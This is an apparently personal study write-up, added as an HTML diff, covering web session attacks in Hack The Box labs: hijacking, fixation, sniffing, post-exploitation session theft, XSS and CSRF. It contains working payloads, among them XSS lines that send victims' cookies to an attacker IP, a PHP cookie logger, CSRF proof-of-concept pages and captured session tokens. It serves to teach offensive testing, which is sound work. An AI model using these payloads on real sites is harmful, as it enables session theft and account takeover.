+<li><a href="#examples">Examples</a>
+<ul>
+<li><a href="#php-1">PHP</a></li>
+<li><a href="#java-1">Java</a></li>
+<li><a href="#net-1">.NET</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#xss-1">XSS</a>
+<ul>
+<li><a href="#validation-of-user-input">Validation of User Input</a></li>
+<li><a href="#html-encoding-to-user-controlled-output">HTML Encoding to User-Controlled Output</a></li>
+<li><a href="#additional-instructions">Additional Instructions</a></li>
+</ul>
+</li>
+<li><a href="#csrf-1">CSRF</a></li>
+<li><a href="#open-redirect-1">Open Redirect</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="session-security"><a class="header" href="#session-security">Session Security</a></h1>
+<h2 id="intro"><a class="header" href="#intro">Intro</a></h2>
+<p>A user session can defined as a sequence of requests originating from the same client and the associated responses during a specific time period. Modern web apps need to maintain user sessions to keep track of information and status about each user. User sessions faciliate the assignment of access or authorization rights, localization settings, etc., while users interact with an app, pre, and post-authentication.</p>
+<p>Each HTTP request should carry all needed information for the server to act upon it appropriately, and the session state resides on the client's side only.</p>
+<h3 id="session-identifier-security"><a class="header" href="#session-identifier-security">Session Identifier Security</a></h3>
+<p>A unique session identifier (<em>Session ID</em>) or token is the basis upon which user sessions are generated and distinguished.</p>
+<p>If an attacker obtains a session identifier, this can result in session hijacking, where the attacker can essentially impersonate the victim in the web app. A session identifier can be:</p>
+<ul>
+<li>captured through passive traffic/packet sniffing</li>
+<li>identified in logs</li>
+<li>predicted</li>
+<li>brute forced</li>
+</ul>
+<p>A session identifier's security level depends on its:</p>
+<ul>
+<li>Validity Scope (<em>a secure session identifier should be valid for one session only</em>)</li>
+<li>Randomnsess (<em>a secure session identifier should be generated through a robust number/string generation algorithm so that it cannot be predicted</em>)</li>
+<li>Validity Time (<em>a secure session identifier should expire after a certain amount of time</em>)</li>
+</ul>
+<p>A session identifier's security level also depends on the location where it is stored:</p>
+<div class="table-wrapper"><table><thead><tr><th>Location</th><th>Description</th></tr></thead><tbody>
+<tr><td>URL</td><td>if this is the case, the HTTP <em>Referer</em> header can leak a session identifier to other websites; in addition, browser history will also contain any session identifier stored in the URL</td></tr>
+<tr><td>HTML</td><td>if this is the case, the session identifier can be identified in both the browser's cache memory and any intermediate proxies</td></tr>
+<tr><td>sessionStorage</td><td>... is a browser storage feature introduced in HTML5; session identifiers stored in sessionStorage can be retrieved as long as the tab or the browser is open; in other words, sessionStorage data gets cleared when the <em>page session</em> ends; note that a page session survives over page reloads and restores</td></tr>
+<tr><td>localStorage</td><td>... is a browser storage feature introduced in HTML5; session identifiers stored in localStorage can be retrieved as long as localStorage does not get deleted by the user; this is because data stored within localStorage will not be deleted when the browser process is terminated, with the exception of "private browsing" or "incognito" sessions where data stored within localStorage are deleted by the time the last tab is closed</td></tr>
+</tbody></table>
+</div>
+<h3 id="session-attacks"><a class="header" href="#session-attacks">Session Attacks</a></h3>
+<p>Can be:</p>
+<ul>
+<li>Session Hijacking</li>
+<li>Session Fixation</li>
+<li>XSS</li>
+<li>CSRF</li>
+<li>Open Redirects</li>
+</ul>
+<h2 id="session-attacks-1"><a class="header" href="#session-attacks-1">Session Attacks</a></h2>
+<h3 id="session-hijacking"><a class="header" href="#session-hijacking">Session Hijacking</a></h3>
+<p>In session hijacking attacks, the attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim.</p>
+<p>An attacker can obtain a victim's session identifier using several methods, with the most common being:</p>
+<ul>
+<li>passive traffic sniffing</li>
+<li>XSS</li>
+<li>browser history or log-diving</li>
+<li>read access to a database containing session information</li>
+</ul>
+<h4 id="example"><a class="header" href="#example">Example</a></h4>
+<h5 id="part-1-identify-the-session-identifier"><a class="header" href="#part-1-identify-the-session-identifier">Part 1: Identify the session identifier</a></h5>
+<ul>
+<li>log into app, using given creds</li>
+<li>use Web Dev Tools</li>
+<li>look for cookie that can be session identifier</li>
+</ul>
+<p><img src="../../../images/session_security1.png" alt="session security 1" /></p>
+<h5 id="part-2-simulate-an-attacker"><a class="header" href="#part-2-simulate-an-attacker">Part 2: Simulate an attacker</a></h5>
+<ul>
+<li>copy cookie</li>
+<li>open new private window</li>
+<li>insert copied cookie</li>
+<li>notice, you can log in without giving creds</li>
+</ul>
+<p><img src="../../../images/session_security2.png" alt="session security 2" /></p>
+<h3 id="session-fixation"><a class="header" href="#session-fixation">Session Fixation</a></h3>
+<p>... occurs when an attacker can fixate a (<em>valid</em>) session identifier. The Attacker will then have to trick the victim into logging into the application using the aforementioned session identifier. If the victim does so, the attacker can proceed to a Session Hijacking attack.</p>
+<p>Such bugs usually occur when session identifiers are being accepted from URL Query Strings or Post Data.</p>
+<p>Such attacks are usually mounted in three stages:</p>
+<ol>
+<li>Attacker manages to obtain a valid session identifier</li>
+<li>Attacker manages to fixate a valid session identifier</li>
+<li>Attacke tricks the victim into establishing a session using the abovementioned session identifier</li>
+</ol>
+<h4 id="example-1"><a class="header" href="#example-1">Example</a></h4>
+<ol>
+<li>Session fixation identification</li>
+</ol>
+<p><img src="../../../images/session_fixation1.png" alt="session fixation 1" /></p>
+<p>If any value or a valid session identifier specified in the <code>token</code> parameter on the URL is propagated to the <code>PHPSESSID</code> cookie's value, you are probably dealing with a session fixation vuln.</p>
+<ol start="2">
+<li>Session fixation exploitation attempt</li>
+</ol>
+<p><img src="../../../images/session_fixation2.png" alt="session fixation 2" /></p>
+<p>Notice that the <code>PHPSESSID</code> cookie's value is <code>IControlThisCookie</code>. You are dealing with a Session Fixation vuln. An attacker could send a URL similar to the above to a victim. If the victim logs into the application, the attacker could easily hijack their session since the session identifier is already known.</p>
+<h4 id="example-of-vulnerable-code"><a class="header" href="#example-of-vulnerable-code">Example of vulnerable code</a></h4>
+<pre><code class="language-php">&lt;?php
+    if (!isset($_GET["token"])) {
+        session_start();
+        header("Location: /?redirect_uri=/complete.html&amp;token=" . session_id());
+    } else {
+        setcookie("PHPSESSID", $_GET["token"]);
+    }
+?&gt;
+</code></pre>
+<h3 id="obtaining-session-identifiers-without-user-interaction"><a class="header" href="#obtaining-session-identifiers-without-user-interaction">Obtaining Session Identifiers without User Interaction</a></h3>
+<h4 id="obtaining-session-identifiers-via-traffic-sniffing"><a class="header" href="#obtaining-session-identifiers-via-traffic-sniffing">Obtaining Session Identifiers via Traffic Sniffing</a></h4>
+<p>Traffic Sniffing is something that most penetration testers do when asessing a network's security from the inside. It requires the attacker and the victim to be on the same local network. Then and only then can HTTP traffic be inspected by the attacker. It is impossible to perform traffic sniffing remotely.</p>
+<ol>
+<li>
+<p>Obtain the victim's cookie through packet analysis</p>
+<ol>
+<li>inside Wireshark, first, apply to see only HTTP traffic</li>
+<li>now search within the Packet bytes for any <code>auth-session</code> cookies</li>
+<li>navigate to <code>Edit</code>, then to <code>Find Packet</code></li>
+<li>left click on <code>Packet List</code>, then on <code>Packet bytes</code></li>
+<li>select string and specify <code>auth-session</code></li>
+<li>click <code>find</code></li>
+<li>copy the cookie by right-clicking on a row that contains it</li>
+<li>click <code>copy</code>, then <code>Value</code></li>
+</ol>
+</li>
+<li>
+<p>Hijack the victim's session</p>
+<ol>
+<li>back on the browser and change the current cookie's value into the obtained value</li>
+<li>refresh page</li>
+</ol>
+</li>
+</ol>
+<h4 id="obtaining-session-identifiers-post-exploitation"><a class="header" href="#obtaining-session-identifiers-post-exploitation">Obtaining Session Identifiers Post-Exploitation</a></h4>
+<p>During the post-exploitation phase, session identifiers and session data can be retrieved from either a web server's disk or memory.</p>
+<h5 id="php"><a class="header" href="#php">PHP</a></h5>
+<p>The entry <code>session.save_path</code> in <code>PHP.ini</code> specifies where session data will be stored.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ locate php.ini
+d41y@htb[/htb]$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
+d41y@htb[/htb]$ cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
+</code></pre>
+<p>A default config could store session data in <code>/var/lib/php/sessions</code> and could look like this:</p>
+<p><img src="../../../images/session_no_interaction_1.png" alt="session no interaction 1" /></p>
+<p>The same PHP session identifier could look like this on a local setup:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ ls /var/lib/php/sessions
+d41y@htb[/htb]$ cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
+</code></pre>
+<p><img src="../../../images/session_no_interaction_2.png" alt="session no interaction 2" /></p>
+<p>For a hacker to hijack the user session related to the session identifier above, a new cookie must be created in the web browser with the following values:</p>
+<ul>
+<li>cookie name: PHPSESSID</li>
+<li>cookie value: s6kitq8d3071rmlvbfitpim9mm</li>
+</ul>
+<h5 id="java"><a class="header" href="#java">Java</a></h5>
+<p>"The Manager element represents the session manager that is used to create and maintain HTTP sessions of a web application.</p>
+<p>Tomcat provides two standard implementations of Manager. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out in a storage location that is selected via the use of an appropriate <code>Store</code> nested element. The filename of the default session data file is <code>SESSIONS.ser</code>."</p>
+<p><a href="https://tomcat.apache.org/tomcat-6.0-doc/config/manager.html">More info here!</a></p>
+<h5 id="net"><a class="header" href="#net">.NET</a></h5>
+<p>Session data can be found in:</p>
+<ul>
+<li>the application worker process (<em><code>aspnet_wp.exe</code></em>)</li>
+<li>StateServer</li>
+<li>SQL Server</li>
+</ul>
+<p><a href="https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/">More info here!</a></p>
+<h4 id="obtaining-session-identifiers-post-exploitation---database-access"><a class="header" href="#obtaining-session-identifiers-post-exploitation---database-access">Obtaining Session Identifiers Post-Exploitation - Database Access</a></h4>
+<p>In cases where you have direct access to a database, you should always check for any stored user sessions.</p>
+<pre><code class="language-sql">show databases;
+use project;
+show tables;
+select * from users;
+</code></pre>
+<p><img src="../../../images/session_no_interaction_3.png" alt="session no interaction 3" /></p>
+<p>Here you can see the user's passwords are hashed. You could spend time trying to crack these; however, there is also a "all_sessions" table.</p>
+<pre><code class="language-sql">select * from all_sessions;
+select * from all_sessions where id=3;
+</code></pre>
+<p><img src="../../../images/session_no_interaction_4.png" alt="session no interaction 4" /></p>
+<p>Here you have successfully extracted the sessions!</p>
+<h3 id="xss"><a class="header" href="#xss">XSS</a></h3>
+<p>For an XSS attack to result in session cookie leakage, the following requirements must be fulfilled:</p>
+<ul>
+<li>Session cookies should be carried in all HTTP requests</li>
+<li>Session cookies should be accessible by JS code</li>
+</ul>
+<h4 id="example-2"><a class="header" href="#example-2">Example</a></h4>
+<p><img src="../../../images/session_security_xss1.png" alt="xss 1" /></p>
+<p>In one field, you can specify the following payload:</p>
+<pre><code class="language-javascript">"&gt;&lt;img src=x onerror=prompt(document.domain)&gt;
+</code></pre>
+<p>You are using <code>document.domain</code> to ensure that JS is being executed on the actual domain and not in a sandboxed environment. JS being executed in a sandboxed environment prevents client-side attacks.</p>
+<p>In the remaining two fields, you specify the following two payloads.</p>
+<pre><code class="language-javascript">"&gt;&lt;img src=x onerror=confirm(1)&gt;
+</code></pre>
+<p>... and:</p>
+<pre><code class="language-javascript">"&gt;&lt;img src=x onerror=alert(1)&gt;
+</code></pre>
+<p>You will need to update the profile by pressing "Save" to submit the payloads.</p>
+<p><img src="../../../images/session_security_xss2.png" alt="xss 2" /></p>
+<p>When successful, you notice no payload being triggered. Often the payload code is not going to be called/executed until another application functionality triggers it. Go to "Share", as it is the only other functionality you have, to see if any of the submitted payloads are retrieved in there. This functionality returns a publicly accessible profile. Identifying a stored XSS vuln in such a functionality would be ideal from an attacker's perspective.</p>
+<p><img src="../../../images/session_security_xss3.png" alt="xss 3" /></p>
+<p>Checking if HTTPOnly flag is set:</p>
+<p><img src="../../../images/session_security_xss4.png" alt="xss 4" /></p>
+<p>... and it's turned off.</p>
+<h5 id="obtaining-session-cookie-through-xss"><a class="header" href="#obtaining-session-cookie-through-xss">Obtaining session cookie through XSS</a></h5>
+<p>You identified that you could create and share publicly accessible profiles that contain your specified XSS payloads.</p>
+<p>The below PHP script can be hosted on a VPS to log cookies:</p>
+<pre><code class="language-php">&lt;?php
+$logFile = "cookieLog.txt";
+$cookie = $_REQUEST["c"];
+
+$handle = fopen($logFile, "a");
+fwrite($handle, $cookie . "\n\n");
+fclose($handle);
+
+header("Location: http://www.google.com/");
+exit;
+?&gt;
+</code></pre>
+<p>It can be run like this:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ php -S &lt;VPN/TUN Adapter IP&gt;:8000
+[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://&lt;VPN/TUN Adapter IP&gt;:8000) started
+</code></pre>
+<p>And the JS payload can be:</p>
+<pre><code class="language-javascript">&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;video style="animation-name:x" onanimationend="window.location = 'http://&lt;VPN/TUN Adapter IP&gt;:8000/log.php?c=' + document.cookie;"&gt;&lt;/video&gt;
+</code></pre>
+<p><em>A sample HTTPS&gt;HTTPS payload can be</em>:</p>
+<pre><code class="language-javascript">&lt;h1 onmouseover='document.write(`&lt;img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}"&gt;`)'&gt;test&lt;/h1&gt;
+</code></pre>
+<p>To test it, you now need to simulate a victim that logs into his or her account and navigates to <code>http://xss.htb.net/profile?email=ela.stienen@example.com</code>.</p>
+<p>Brings you the cookie:</p>
+<pre><code class="language-bash">┌──(d41y㉿user)-[~/ctf/htb/vpns]
+└─$ php -S 10.10.15.211:8000
+[Thu Jun  5 16:54:16 2025] PHP 8.3.6 Development Server (http://10.10.15.211:8000) started
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43762 Accepted
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43762 [404]: GET /log.php?c=auth-session=s%3AxPy0i5ab8K2Kqxr7XX83jApGWqisXRzW.Lg3WQ4lXpdexxCKvvaTOFqqNu51TUJ%2F%2Bavh0PcCEmQI - No such file or directory
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43762 Closing
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43776 Accepted
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43776 [404]: GET /favicon.ico - No such file or directory
+[Thu Jun  5 16:54:23 2025] 10.10.15.211:43776 Closing
+</code></pre>
+<h5 id="obtaining-session-cookies-through-xss-netcat-edition"><a class="header" href="#obtaining-session-cookies-through-xss-netcat-edition">Obtaining session cookies through XSS (Netcat edition)</a></h5>
+<p>First, you need to place the payload into the vulnerable field and click "Save".</p>
+<p>Payload:</p>
+<pre><code class="language-javascript">&lt;h1 onmouseover='document.write(`&lt;img src="http://&lt;VPN/TUN Adapter IP&gt;:8000?cookie=${btoa(document.cookie)}"&gt;`)'&gt;test&lt;/h1&gt;
+</code></pre>
+<p>Also, instruct Netcat to listen on port 8000:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ nc -nlvp 8000
+listening on [any] 8000 ...
+</code></pre>
+<p>Simulating the victim and navigating to the shared profile of Ela, brings you the cookie when the victim hovers over "test":</p>
+<pre><code class="language-bash">┌──(d41y㉿user)-[~/ctf/htb/vpns]
+└─$ nc -lnvp 8000        
+Listening on 0.0.0.0 8000
+Connection received on 10.10.15.211 56118
+GET /?cookie=YXV0aC1zZXNzaW9uPXMlM0F4UHkwaTVhYjhLMktxeHI3WFg4M2pBcEdXcWlzWFJ6Vy5MZzNXUTRsWHBkZXh4Q0t2dmFUT0ZxcU51NTFUVUolMkYlMkJhdmgwUGNDRW1RSQ== HTTP/1.1
+Host: 10.10.15.211:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
+Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://xss.htb.net/
+Priority: u=4, i
+</code></pre>
+<p>You can no hijack the victim's session.</p>
+<blockquote>
+<p>[!TIP]
+You don't necessarily have to use the <code>window.location()</code> object that causes the victim to get redirected. You can use <code>fetch()</code>, which can fetch data and send it to your server without any redirects. This is a stealthier way.<br>
+Example:<br>
+<code>&lt;script&gt;fetch(`http://&lt;VPN/TUN Adapter IP&gt;:8000?cookie=${btoa(document.cookie)}`)&lt;/script&gt;</code></p>
+</blockquote>
+<h3 id="csrf"><a class="header" href="#csrf">CSRF</a></h3>
+<p>... is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with. These web pages contain malicious requests that essentially inherit the identity and privileges of the victim to perform an undesired function on the victim's behalf.</p>
+<p>A web app is vulnerable to CSRF when:</p>
+<ul>
+<li>all the parameters required for the targeted request can be determined or guessed by the attacker</li>
+<li>the application's session management is solely based on HTTP cookies, which are automatically included in browser request</li>
+</ul>
+<p>To successfully exploit CSRF, you need:</p>
+<ul>
+<li>to craft a malicious web page that will issue a valid (<em>cross-site</em>) request impersonating the victim</li>
+<li>the victim to be logged into the application at the time when the malicious cross-site request is issued</li>
+</ul>
+<h4 id="example-3"><a class="header" href="#example-3">Example</a></h4>
+<p>Log in with given credentials, activate Burpsuite and change the contact info.</p>
+<p>Interception with Burp:</p>
+<p><img src="../../../images/session_security_csrf1.png" alt="csrf 1" /></p>
+<p>You notice no anti-CSRF token in the update-profile request. Now try executing a CSRF attack that will change her profile details by simply visiting another website.</p>
+<p>Create and serve the below HTML:</p>
+<pre><code class="language-html">&lt;html&gt;
+  &lt;body&gt;
+    &lt;form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST"&gt;
+      &lt;input type="hidden" name="email" value="attacker@htb.net" /&gt;
+      &lt;input type="hidden" name="telephone" value="&amp;#40;227&amp;#41;&amp;#45;750&amp;#45;8112" /&gt;
+      &lt;input type="hidden" name="country" value="CSRF_POC" /&gt;
+      &lt;input type="submit" value="Submit request" /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+      document.getElementById("submitMe").submit()
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>... and:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ python -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+</code></pre>
+<p>Open a new tab and visit the page you are serving from your attacking machine:</p>
+<p><img src="../../../images/session_security_csrf2.png" alt="csrf 2" /></p>
+<h3 id="csrf---get-based"><a class="header" href="#csrf---get-based">CSRF - GET-based</a></h3>
+<p>Similar to how you can extract session cookies from applications that do not utilize SSL encryption, you can do the same regarding CSRF tokens included in unencrypted requests.</p>
+<h4 id="example-4"><a class="header" href="#example-4">Example</a></h4>
+<p>Log on with given credentials. Browse to the profile and click "Save".</p>
+<p><img src="../../../images/session_security_csrf3.png" alt="csrf 3" /></p>
+<p>Activate Burp and click "Save" again.</p>
+<p><img src="../../../images/session_security_csrf4.png" alt="csrf 4" /></p>
+<p>The CSRF token is included in the GET request.</p>
+<p>Now simulate an attacker on the local network that sniffed the abovementioned request and wants to deface Julie Rogers' profile through a CSRF attack.</p>
+<p>First, create and serve the below HTML:</p>
+<pre><code class="language-html">&lt;html&gt;
+  &lt;body&gt;
+    &lt;form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET"&gt;
+      &lt;input type="hidden" name="email" value="attacker@htb.net" /&gt;
+      &lt;input type="hidden" name="telephone" value="&amp;#40;227&amp;#41;&amp;#45;750&amp;#45;8112" /&gt;
+      &lt;input type="hidden" name="country" value="CSRF_POC" /&gt;
+      &lt;input type="hidden" name="action" value="save" /&gt;
+      &lt;input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" /&gt;
+      &lt;input type="submit" value="Submit request" /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+      document.getElementById("submitMe").submit()
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>... and:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ python -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+</code></pre>
+<p>Open a new tab and visit the page you are serving from your attacking machine.</p>
+<p><img src="../../../images/session_security_csrf5.png" alt="csrf 5" /></p>
+<h3 id="csrf---post-based"><a class="header" href="#csrf---post-based">CSRF - POST-based</a></h3>
+<h4 id="example-5"><a class="header" href="#example-5">Example</a></h4>
+<p>Log in with the given credentials and click on "Delete". You will get redirected to <code>/app/delete/&lt;your-email&gt;</code>.</p>
+<p><img src="../../../images/session_security_csrf6.png" alt="csrf 6" /></p>
+<p>Notice that the email is reflected on the page. Try inputting some HTML into the email value, such as:</p>
+<pre><code class="language-html">&lt;h1&gt;h1&lt;u&gt;underline&lt;%2fu&gt;&lt;%2fh1&gt;
+</code></pre>
+<p><img src="../../../images/session_security_csrf7.png" alt="csrf 7" /></p>
+<p>If you inspect the source, you will notice that your injection happens before a <code>'</code>. You can abuse this to leak the CSRF token.</p>
+<p><img src="../../../images/session_security_csrf8.png" alt="csrf 8" /></p>
+<p>First, instruct Netcat to listen on port 8000:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ nc -nlvp 8000
+listening on [any] 8000 ...
+</code></pre>
+<p>Now you can get the CSRF token via sending the below payload:</p>
+<pre><code class="language-html">&lt;table%20background='%2f%2f&lt;VPN/TUN Adapter IP&gt;:PORT%2f
+</code></pre>
+<p>While still logged in as Julie Rogers, open a new tab and visit the <code>http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f&lt;VPN/TUN Adapter IP&gt;:8000%2f</code>. You will notice a connection being made that leaks the CSRF token.</p>
+<p><img src="../../../images/session_security_csrf9.png" alt="csrf 9" /></p>
+<h3 id="xss--csrf-chaining"><a class="header" href="#xss--csrf-chaining">XSS &amp; CSRF Chaining</a></h3>
+<h4 id="example-6"><a class="header" href="#example-6">Example</a></h4>
+<p>Log in with the given credentials, activate Burp and click "Make Public!".</p>
+<p><img src="../../../images/session_security_csrf10.png" alt="csrf 10" /></p>
+<p>... leads to:</p>
+<p><img src="../../../images/session_security_csrf11.png" alt="csrf 11" /></p>
+<p>Forward all requests so that Ela Stienen's profile becomes public.</p>
+<p>The payload you need to specify in the <em>Country Field</em> of Ela Stienen's profile to successfully execute CSRF:</p>
+<pre><code class="language-javascript">&lt;script&gt;
+// part1: creates an ObjectVariable called req, which you will be using to generate a request
+var req = new XMLHttpRequest();
+// is allowing you to get ready to send HTTP requests
+req.onload = handleResponse;
+// the 'onload' event handler performs an action once the page has been loaded
+req.open('get','/app/change-visibility',true);
+// request method, targeted path, continuation of execution
+req.send();
+// will send everything you constructed in the HTTP request
+// part1
+// part2: defines a function called 'handleResponse'
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+    // defines a variable called 'token', which gets the value of 'responseText'
+    // '/name="csrf" type="hidden" value="(\w+)"/)[1];' looks for a hidden input field called 'csrf' and \w+ matches one or more alphanumeric chars
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/change-visibility', true);
+    // changes the method from GET to POST
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    // sets 'Content-Type' to 'application/x-www-form-urlencoded'
+    changeReq.send('csrf='+token+'&amp;action=change');
+    // sends the request with one param called 'csrf' having the value of the 'token' variable, and another called 'action' with the value 'change'
+};
+// part2
+&lt;/script&gt;
+</code></pre>
+<p>Now, try to make the victim's profile public.</p>
+<p>First, submit the full payload to the <em>Country Field</em> of Ela Stienen's profile and click "Save".</p>
+<p><img src="../../../images/session_security_csrf12.png" alt="csrf 12" /></p>
+<p>Open a new private window, navigate to the website again, and log in using different credentials.</p>
+<p>This user has its profile "private". No "Share" functionality exists.</p>
+<p><img src="../../../images/session_security_csrf13.png" alt="csrf 13" /></p>
+<p>Open a new tab and browse Ela Stienen's public profile by navigating to <code>http://minilab.htb.net/profile?email=ela.stienen@example.com</code>.</p>
+<p>Now, if you go back to the victim's usual profile page and refresh/reload the page, you should see that his profile became "public".</p>
+<p><img src="../../../images/session_security_csrf14.png" alt="csrf 14" /></p>
+<p>You just executed a CSRF-attack through XSS, bypassing the <em>same origin/same site</em> protections in place.</p>
+<h3 id="exploiting-weak-csrf-tokens"><a class="header" href="#exploiting-weak-csrf-tokens">Exploiting Weak CSRF Tokens</a></h3>
+<p>Often, web apps do not employ very secure or robust token generation algorithms.</p>
+<h4 id="example-7"><a class="header" href="#example-7">Example</a></h4>
+<p>Log in with the given credentials, open Web Developer Tools, initiate a request and note the value of the CSRF token.</p>
+<p><img src="../../../images/session_security_csrf15.png" alt="csrf 15" /></p>
+<p>Execute the below command to calculate the MD5 hash of the string "goldenpeacock467" (<em>the username</em>):</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ echo -n goldenpeacock467 | md5sum
+0bef12f8998057a7656043b6d30c90a2  -
+</code></pre>
+<p>The resulting has is the same as the CSRF value. This means that the CSRF token is generated by MD5-hashing the username.</p>
+<p>Find the malicious page you can use to attack other users below.</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;meta name="referrer" content="never"&gt;
+    &lt;title&gt;Proof-of-concept&lt;/title&gt;
+    &lt;link rel="stylesheet" href="styles.css"&gt;
+    &lt;script src="./md5.min.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h1&gt; Click Start to win!&lt;/h1&gt;
+    &lt;button class="button" onclick="trigger()"&gt;Start!&lt;/button&gt;
+
+    &lt;script&gt;
+        let host = 'http://csrf.htb.net'
+
+        function trigger(){
+            // Creating/Refreshing the token in server side.
+            window.open(`${host}/app/change-visibility`)
+            window.setTimeout(startPoc, 2000)
+        }
+
+        function startPoc() {
+            // Setting the username
+            let hash = md5("crazygorilla983")
+
+            window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&amp;action=change`
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>For the malicious page to have MD5-hashing, save the below script and place it in the directory where the malicious page resides.</p>
+<pre><code class="language-javascript">!function(n){"use strict";function d(n,t){var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r}function f(n,t,r,e,o,u){return d((u=d(d(t,n),d(e,u)))&lt;&lt;o|u&gt;&gt;&gt;32-o,r)}function l(n,t,r,e,o,u,c){return f(t&amp;r|~t&amp;e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t&amp;e|r&amp;~e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function c(n,t){var r,e,o,u;n[t&gt;&gt;5]|=128&lt;&lt;t%32,n[14+(t+64&gt;&gt;&gt;9&lt;&lt;4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h&lt;n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=g(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=g(a,c,f,i,n[h+6],9,-1069501632),i=g(i,a,c,f,n[h+11],14,643717713),f=g(f,i,a,c,n[h],20,-373897302),c=g(c,f,i,a,n[h+5],5,-701558691),a=g(a,c,f,i,n[h+10],9,38016083),i=g(i,a,c,f,n[h+15],14,-660478335),f=g(f,i,a,c,n[h+4],20,-405537848),c=g(c,f,i,a,n[h+9],5,568446438),a=g(a,c,f,i,n[h+14],9,-1019803690),i=g(i,a,c,f,n[h+3],14,-187363961),f=g(f,i,a,c,n[h+8],20,1163531501),c=g(c,f,i,a,n[h+13],5,-1444681467),a=g(a,c,f,i,n[h+2],9,-51403784),i=g(i,a,c,f,n[h+7],14,1735328473),c=v(c,f=g(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=v(a,c,f,i,n[h+8],11,-2022574463),i=v(i,a,c,f,n[h+11],16,1839030562),f=v(f,i,a,c,n[h+14],23,-35309556),c=v(c,f,i,a,n[h+1],4,-1530992060),a=v(a,c,f,i,n[h+4],11,1272893353),i=v(i,a,c,f,n[h+7],16,-155497632),f=v(f,i,a,c,n[h+10],23,-1094730640),c=v(c,f,i,a,n[h+13],4,681279174),a=v(a,c,f,i,n[h],11,-358537222),i=v(i,a,c,f,n[h+3],16,-722521979),f=v(f,i,a,c,n[h+6],23,76029189),c=v(c,f,i,a,n[h+9],4,-640364487),a=v(a,c,f,i,n[h+12],11,-421815835),i=v(i,a,c,f,n[h+15],16,530742520),c=m(c,f=v(f,i,a,c,n[h+